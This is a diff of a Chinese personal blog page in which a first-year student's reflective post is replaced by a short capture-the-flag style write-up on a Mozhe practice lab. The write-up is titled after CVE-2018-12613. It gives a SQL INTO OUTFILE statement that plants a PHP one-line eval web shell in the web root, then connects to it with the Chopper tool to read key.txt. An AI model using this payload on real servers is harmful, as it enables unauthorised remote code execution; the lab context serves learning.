@@ -3,23 +3,28 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>My first blog | 37° &#39;s blog</title>
+  <title>CVE-2018-12613漏洞复现 | 37° &#39;s blog</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是我的第一篇博客，实在是不想第一篇就写技术类的文章，主要是我也没有技术，哈哈。写一些什么好呢？现在上大一，就先写一些我的感想吧，作为我的起点。   首先，我是小菜鸟一枚，以下的观点可能不正确，欢迎批评指正。 大一上学期时间就这样的过去了，经过了半年的时间，我也有了很深的体悟：大学，不是我们想的那么简单!上学期，感觉时间过的好快，自己刚退伍回来，已经两年没有了学习，在部队，天天都是一些不费脑子的活">
+  <meta name="description" content="前言第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。 靶机链接https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe 解题思路注入  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别">
 <meta property="og:type" content="article">
-<meta property="og:title" content="My first blog">
-<meta property="og:url" content="http://yoursite.com/2019/01/15/title/index.html">
+<meta property="og:title" content="CVE-2018-12613漏洞复现">
+<meta property="og:url" content="http://yoursite.com/2019/01/15/漏洞复现/index.html">
 <meta property="og:site_name" content="37° &#39;s blog">
-<meta property="og:description" content="这是我的第一篇博客，实在是不想第一篇就写技术类的文章，主要是我也没有技术，哈哈。写一些什么好呢？现在上大一，就先写一些我的感想吧，作为我的起点。   首先，我是小菜鸟一枚，以下的观点可能不正确，欢迎批评指正。 大一上学期时间就这样的过去了，经过了半年的时间，我也有了很深的体悟：大学，不是我们想的那么简单!上学期，感觉时间过的好快，自己刚退伍回来，已经两年没有了学习，在部队，天天都是一些不费脑子的活">
+<meta property="og:description" content="前言第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。 靶机链接https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe 解题思路注入  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-21T01:48:01.770Z">
+<meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a27f503b54.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a297866139.png">
+<meta property="og:image" content="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png">
+<meta property="og:updated_time" content="2019-03-26T13:35:12.837Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="My first blog">
-<meta name="twitter:description" content="这是我的第一篇博客，实在是不想第一篇就写技术类的文章，主要是我也没有技术，哈哈。写一些什么好呢？现在上大一，就先写一些我的感想吧，作为我的起点。   首先，我是小菜鸟一枚，以下的观点可能不正确，欢迎批评指正。 大一上学期时间就这样的过去了，经过了半年的时间，我也有了很深的体悟：大学，不是我们想的那么简单!上学期，感觉时间过的好快，自己刚退伍回来，已经两年没有了学习，在部队，天天都是一些不费脑子的活">
+<meta name="twitter:title" content="CVE-2018-12613漏洞复现">
+<meta name="twitter:description" content="前言第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。 靶机链接https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe 解题思路注入  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别">
+<meta name="twitter:image" content="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png">
   
     <link rel="alternative" href="/atom.xml" title="37° &#39;s blog" type="application/atom+xml">
   
@@ -213,10 +218,10 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-title" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/01/15/title/" class="article-date">
+      <a href="/2019/01/15/漏洞复现/" class="article-date">
   	<time datetime="2019-01-15T07:41:18.000Z" itemprop="datePublished">2019-01-15</time>
 </a>
     </div>
@@ -230,7 +235,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      My first blog
+      CVE-2018-12613漏洞复现
       
     </h1>
   
@@ -244,7 +249,7 @@
         
           
 <div class="counter-tag counter">
-    <span id="/2019/01/15/title/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="My first blog">
+    <span id="/2019/01/15/漏洞复现/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="CVE-2018-12613漏洞复现">
          &nbsp;
         view
     </span>
@@ -257,14 +262,22 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这是我的第一篇博客，实在是不想第一篇就写技术类的文章，主要是我也没有技术，哈哈。写一些什么好呢？现在上大一，就先写一些我的感想吧，作为我的起点。  </p>
-<p>首先，我是小菜鸟一枚，以下的观点可能不正确，欢迎批评指正。</p>
-<p>大一上学期时间就这样的过去了，经过了半年的时间，我也有了很深的体悟：大学，不是我们想的那么简单!上学期，感觉时间过的好快，自己刚退伍回来，已经两年没有了学习，在部队，天天都是一些不费脑子的活动，再加上自己对计算机也不是很理解，开学一段时间，不知道自己天天学的是啥，很迷茫。这一学期下来，基本上没有听过课，上课都是在学习自己喜欢的计算机知识或者是看一些其他的。</p>
-<p>对于程序设计，以前的我总是自我感觉良好，觉得老师教的都会，留的实验报告都能做出来，然后我就飘飘然，现在感觉自己的目光太短浅了，程序设计并不是自己想的那么简单，自己才学到的是简单的语法和结构，深入的算法都一无所知。</p>
-<p>对于信息安全，刚开学时，自己加入了信息安全实验室，那时感觉自己对这方面挺热爱，感兴趣，当学了一段时间之后，发现都没有那么简单，好多时候都是做了一晚上一道题都做不出来，但一学期过去了，虽然我还是感觉技术没有增加多少，但我还是挺喜欢信息安全的，并相信自己能一直坚持学下去。</p>
-<p>现在的我，有时候有些迷茫，特别是在有很多题做不出来，或者是怎么也做不对的时候。但我从未放弃过，自己选择的路，跪着也要走完！在经过着一学期之后，我在学习上也有了许多方法，不再像刚入学的时候什么都不知道了，也慢慢的懂得了自己要学的方向。</p>
-<p>其实无论什么事情，坚持最重要，若害怕困难，还能搞什么事情？？？做一个不忘初心的人。</p>
-
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。</strong></p>
+<h1 id="靶机链接"><a href="#靶机链接" class="headerlink" title="靶机链接"></a>靶机链接</h1><p><a href="https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe</a></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别人的解题思路，对于我这种还没有学过sql注入的，看了一下别人的解题思路依旧是一脸懵逼，因此只能去百度了一下数据库的常用命令。首先我通过命令<br><em>数据库命令：<a href="http://blog.sina.com.cn/s/blog_4c197d420101aywx.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4c197d420101aywx.html</a></em></p>
+<blockquote>
+<p>show variables like ‘datadir’<br>即查看数据库的物理路径，通过这个命令返回了一个路径，如下图：</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png" alt=""></p>
+<p>  通过得到的路径，我们可以知道这个是Linux上的，在Linux上网站的默认目录是<strong>/var/www/html/</strong>，因此就可以用一句话木马注入：</p>
+<blockquote>
+<p>Select “&lt;?php @eval($_POST[password]);?&gt;” INTO OUTFILE “/&gt;var/www/html/password.php”</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/03/26/5c9a27f503b54.png" alt=""><br>显示如图所示，表示注入成功。</p>
+<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>注入成功之后就可以使用菜刀连接，如图所示：<br><img src="https://i.loli.net/2019/03/26/5c9a297866139.png" alt=""></p>
+<p><strong>注意箭头所指的地方是自己注入的时候所用的文件名和密码！</strong></p>
+<p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
       
     </div>
     
@@ -273,20 +286,15 @@
     
 <nav id="article-nav">
   
-    <a href="/2019/01/15/python字典，数组推导式/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/01/15/title/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">&lt;</strong>
       <div class="article-nav-title">
         
-          python的列表推导式，字典推导式和三元运算符
+          My first blog
         
       </div>
     </a>
   
-  
-    <a href="/2019/01/15/漏洞复现/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CVE-2018-12613漏洞复现</div>
-      <strong class="article-nav-caption">&gt;</strong>
-    </a>
   
 </nav>
 
@@ -294,7 +302,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="title" data-title="My first blog" data-url="http://yoursite.com/2019/01/15/title/" data-images="https://i.loli.net/2019/01/18/5c41d6b1f13df.jpg" data-content="My first blog">
+<div class="ds-share share" data-thread-key="漏洞复现" data-title="CVE-2018-12613漏洞复现" data-url="http://yoursite.com/2019/01/15/漏洞复现/" data-images="https://i.loli.net/2019/01/18/5c41d6b1f13df.jpg" data-content="CVE-2018-12613漏洞复现">
     <div class="ds-share-inline">
       <ul class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
